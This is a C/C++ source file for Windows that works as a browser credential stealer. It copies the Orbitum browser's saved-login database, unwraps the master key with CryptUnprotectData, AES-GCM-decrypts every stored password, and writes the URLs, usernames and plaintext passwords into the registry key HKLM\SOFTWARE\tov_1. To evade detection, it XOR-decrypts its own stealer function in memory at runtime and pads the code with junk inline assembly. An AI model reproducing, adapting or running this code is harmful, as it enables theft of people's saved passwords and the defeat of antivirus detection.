#include <stdlib.h>
#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include <winsqlite/winsqlite3.h>
#include <vector>
#include <string>
#include <regex>
#include <openssl/bio.h>
#include <openssl/evp.h>

const char cFileL[] = "C:/Users/";
const char cFileR[] = "/AppData/Local/Orbitum/User Data/Default/Login Data";
const char cFileR1[] = "/AppData/Local/Orbitum/User Data/Local State";
const char cFileNew[] = "tmp";
const char cFileNew1[] = "tmp1";
const char cQuery[] = "SELECT origin_url, username_value, password_value FROM logins";

typedef struct tuple {
    char origin_url[BUFSIZ]         = { 0 };
    char username_value[BUFSIZ]     = { 0 };
    char decrypted_password[BUFSIZ] = { 0 };
} tuple;

static const std::string base64_chars =
"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
"abcdefghijklmnopqrstuvwxyz"
"0123456789+/";

void aes_gcm_decrypt(const unsigned char* in_data, const int data_size, const unsigned char* gcm_key, char *result)
{
    EVP_CIPHER_CTX* ctx;
    int outlen, tmplen, rv;
    const unsigned char* gcm_iv = &in_data[3];
    const unsigned char* gcm_ct = &in_data[15];
    unsigned char outbuf[BUFSIZ] = { 0 };
    ctx = EVP_CIPHER_CTX_new();
    EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_AEAD_SET_IVLEN, 12, NULL);
    EVP_DecryptInit_ex(ctx, NULL, NULL, gcm_key, gcm_iv);
    EVP_DecryptUpdate(ctx, outbuf, &outlen, gcm_ct, data_size - 15);
    EVP_CIPHER_CTX_free(ctx);
    memcpy(result, outbuf, outlen - 16);
}

void bd_request(const char* f1, const char* f2)
{
    int retval = 0;
    unsigned char* pMasterKey = NULL;
    sqlite3* db;
    sqlite3_stmt* statementHandle;
    std::vector<tuple> obtainedData;
    
    CopyFile(
        f2,
        cFileNew1,
        FALSE
    );

    //getMasterKey(&pMasterKey);
    char* buffer = NULL;

    int iLen = 0;
    FILE* F = NULL;
    fopen_s(&F, cFileNew1, "rb");
    if (F == NULL)
    {
        return;
    }

    fseek(F, 0L, SEEK_END);
    iLen = ftell(F);
    fseek(F, 0L, SEEK_SET);

    buffer = (char*)calloc(iLen, 1);
    fread(buffer, 1, iLen, F);

    //readFile(&buffer, cFileNew1);
    
    std::string data = buffer;
    free(buffer);
    std::regex key("\"encrypted_key\":\"([^\"]+)\"");
    std::smatch smch;
    std::string::const_iterator pars(data.cbegin());
    std::regex_search(pars, data.cend(), smch, key);

    int in_len = smch.str(1).size();
    int i = 0;
    int j = 0;
    int in_ = 0;
    unsigned char char_array_4[4], char_array_3[3];
    std::string ret;

    while (in_len-- && (smch.str(1)[in_] != '=') && (isalnum(smch.str(1)[in_]) || (smch.str(1)[in_] == '+') || (smch.str(1)[in_] == '/'))/*(smch.str(1)[in_])*/) {
        char_array_4[i++] = smch.str(1)[in_]; in_++;
        if (i == 4) {
            for (i = 0; i < 4; i++)
                char_array_4[i] = base64_chars.find(char_array_4[i]);

            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

            for (i = 0; (i < 3); i++)
                ret += char_array_3[i];
            i = 0;
        }
    }

    if (i) {
        for (j = i; j < 4; j++)
            char_array_4[j] = 0;

        for (j = 0; j < 4; j++)
            char_array_4[j] = base64_chars.find(char_array_4[j]);

        char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
        char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
        char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

        for (j = 0; (j < i - 1); j++) ret += char_array_3[j];
    }
    //std::string decoded = base64_decode(smch.str(1));
    std::string decoded = ret;

    decoded = decoded.substr(5);
    DATA_BLOB in, out;
    in.cbData = decoded.length();
    in.pbData = (BYTE*)decoded.data();
    CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out);
    pMasterKey = (unsigned char*)calloc(32, 1);
    memcpy(pMasterKey, out.pbData, 32);

    DeleteFile(cFileNew1);

    CopyFile(
        f1,
        cFileNew,
        FALSE
    );

    retval = sqlite3_open_v2(
        cFileNew,
        &db,
        SQLITE_OPEN_READONLY,
        NULL
    );
    if (retval != SQLITE_OK)
    {
        DeleteFile(cFileNew);
        free(pMasterKey);
        exit(1);
    }

    retval = sqlite3_prepare_v2(
        db,
        cQuery,
        -1,
        &statementHandle,
        NULL
    );
    if (retval != SQLITE_OK)
    {
        sqlite3_close(db);
        DeleteFile(cFileNew);
        free(pMasterKey);
        exit(2);
    }

    while (sqlite3_step(statementHandle) == SQLITE_ROW)
    {
        tuple tmp;
        memcpy(tmp.origin_url, sqlite3_column_text(statementHandle, 0), BUFSIZ);
        memcpy(tmp.username_value, sqlite3_column_text(statementHandle, 1), BUFSIZ);
        aes_gcm_decrypt(
            (const unsigned char*)sqlite3_column_blob(statementHandle, 2),
            sqlite3_column_bytes(statementHandle, 2),
            pMasterKey,
            tmp.decrypted_password
        );
        obtainedData.push_back(tmp);
    }

    sqlite3_finalize(statementHandle);
    sqlite3_close(db);
    free(pMasterKey);
    DeleteFile(cFileNew);
    //return obtainedData;

    HKEY hKey;
    LPCTSTR sk = TEXT("SOFTWARE\\tov_1");
    //LONG retval;
    retval = RegCreateKeyEx(
        HKEY_LOCAL_MACHINE,
        sk,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &hKey,
        NULL
    );
    if (retval != ERROR_SUCCESS)
    {
        return;
    }
    for (std::vector<tuple>::iterator it = obtainedData.begin(); it != obtainedData.end(); it++)
    {
        std::string str = (*it).username_value;
        str += " ";
        str += (*it).decrypted_password;

        retval = RegSetValueEx(
            hKey,
            (*it).origin_url,
            0,
            REG_SZ,
            (LPBYTE)str.c_str(),
            str.length()
        );
        if (retval != ERROR_SUCCESS)
        {
            continue;
        }
    }
    retval = RegCloseKey(hKey);
    if (retval != ERROR_SUCCESS)
    {
        return;
    }

}

//#define keyTMP 0x5A // todo random key
#define FUNC_SIZE_func 0x0F3A // size of function func() in bytes
void getRWX(void* startAddr, void* endAddr)
{
    MEMORY_BASIC_INFORMATION mbi;

__asm push ecx;
__asm pop ecx;
    //for (unsigned char* p = (unsigned char*)startAddr; p < (unsigned char*)endAddr; p += mbi.RegionSize)
    //{
__asm nop;
__asm inc ecx;
__asm dec ecx;
        // get rwx permissions
        //VirtualQuery((void*)p, &mbi, sizeof(mbi));
        VirtualQuery((void*)startAddr, &mbi, sizeof(mbi));
__asm push ebx;
__asm pop ebx;
        VirtualProtect(mbi.BaseAddress, mbi.RegionSize, PAGE_EXECUTE_READWRITE, &mbi.Protect);
    //}
}

void decryptSelf(void* address, const unsigned int size/*, const unsigned char key*/)
{
    unsigned int* pJmpOffset = (unsigned int*)((unsigned char*)address + 1);
__asm push eax;
__asm inc ecx;
__asm dec ecx;
__asm pop eax;
    unsigned char* pAddr = (unsigned char*)address + *pJmpOffset + 5;
__asm nop;
__asm nop;
__asm inc eax;
__asm dec eax;
__asm inc ecx;
__asm dec ecx;
    unsigned char key = 0;

__asm inc ebx;
__asm dec ebx;
    getRWX(pAddr, pAddr + size);

    key = (*pAddr) ^ 0x55;

__asm inc ecx;
__asm dec ecx;
    for (int i = 0; i < size; i++) {
__asm push ebx;
__asm push eax;
__asm push ebx;
__asm pop ebx;
__asm pop eax;
__asm pop ebx;
        *(pAddr + i) ^= key;
    }
__asm nop;
__asm push ecx;
__asm pop ecx;
}

void main()
{
__asm nop;
__asm inc eax;
__asm dec eax;
__asm inc ebx;
__asm dec ebx;
    char cUsername[UNLEN + 1];
    char cFileFull[sizeof(cFileL) + sizeof(cFileR) + UNLEN + 1] = { 0 };
    char cFileFull1[sizeof(cFileL) + sizeof(cFileR1) + UNLEN + 1] = { 0 };
    DWORD username_len = UNLEN + 1;
__asm nop;
__asm push ebx;
__asm pop ebx;
    std::vector<tuple> obtainedData;

    decryptSelf((void*)&bd_request, FUNC_SIZE_func);

__asm inc edx;
__asm inc ebx;
__asm nop;
__asm push edx;
__asm pop edx;
__asm inc eax;
__asm dec eax;
__asm dec ebx;
__asm dec edx;
    GetUserName(cUsername, &username_len);
    strcat_s(cFileFull, cFileL);
    strcat_s(cFileFull, cUsername);
__asm inc edx;
__asm nop;
__asm inc eax;
__asm dec eax;
__asm dec edx;
    strcat_s(cFileFull, cFileR);
    strcat_s(cFileFull1, cFileL);
__asm inc eax;
__asm dec eax;
    strcat_s(cFileFull1, cUsername);
    strcat_s(cFileFull1, cFileR1);
    
    bd_request(cFileFull, cFileFull1);
__asm inc ebx;
__asm dec ebx;
    

__asm inc edx;
__asm nop;
__asm inc ebx;
__asm dec ebx;
__asm dec edx;
    //WriteRegistry(&obtainedData);

    system("pause");
}
